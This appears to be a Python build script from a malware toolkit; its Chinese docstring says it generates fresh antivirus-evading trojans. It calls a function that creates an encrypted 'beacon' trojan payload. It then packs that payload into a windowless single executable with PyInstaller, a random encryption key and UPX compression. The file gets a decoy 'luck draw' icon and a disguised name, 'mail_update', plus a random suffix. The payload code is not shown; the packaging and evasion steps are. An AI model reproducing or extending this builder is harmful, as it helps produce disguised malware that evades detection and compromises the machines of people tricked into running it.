import datetime
import hashlib
import os.path

from common.project_path import project_path
from tmp_deal import create_cipher_beacon
from common.crypto_utils import crypto_utils

import subprocess

"""
生成船新的免杀马
"""


def exec_cmd(cmd):
    # logger.info(f"执行中: {cmd}")
    print(cmd)
    ex = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    pipe, err = ex.communicate()
    status = ex.wait()
    # logger.info(f"status: {status}")
    if "completed successfully.".encode() not in err:
        print("出错啦")
        print( err.decode())
        # logger.error(err.decode(encoding='gbk'))
        exit(1)
    print(pipe.decode('gbk'))
    # logger.info("编译成功")
    # logger.debug(err.decode('gbk'))
    return pipe.decode('gbk')


def get_rand_key():
    return crypto_utils.get_key().decode()


def get_rand_str():
    date = datetime.datetime.now()
    hash_class = hashlib.sha256()
    hash_class.update(str(date).encode())
    return hash_class.hexdigest()


def compile_py2exe(from_file_name="step3.py",out_file_name="mail_update"):

    pyinstaller_path = project_path.add_abs_path("venv\\Scripts\\pyinstaller.exe")

    out_file_path = f'..\\dist\\{out_file_name}_{get_rand_str()[:5]}'

    from_file_path = project_path.add_abs_path(from_file_name)
    # out_file_path = os.getcwd() + f"\\dist\\{out_file_name}_{get_rand_str()[:5]}"
    specpath_path = project_path.add_abs_path("spec")
    resource_path = project_path.add_abs_path("resource\luck draw.ico")
    upx_path = project_path.add_abs_path("resource\\upx\\upx.exe")
    data = exec_cmd(f'"{pyinstaller_path}" --clean -F -w "{from_file_path}" --key "{get_rand_str()[:16]}" --specpath "{specpath_path}"  -i "{resource_path}" -n "{out_file_path}" --upx-dir="{upx_path}"')
    print(data)


def gen():
    # 生成加密后的木马逻辑step2.py
    create_cipher_beacon()
    compile_py2exe()


if __name__ == '__main__':
    gen()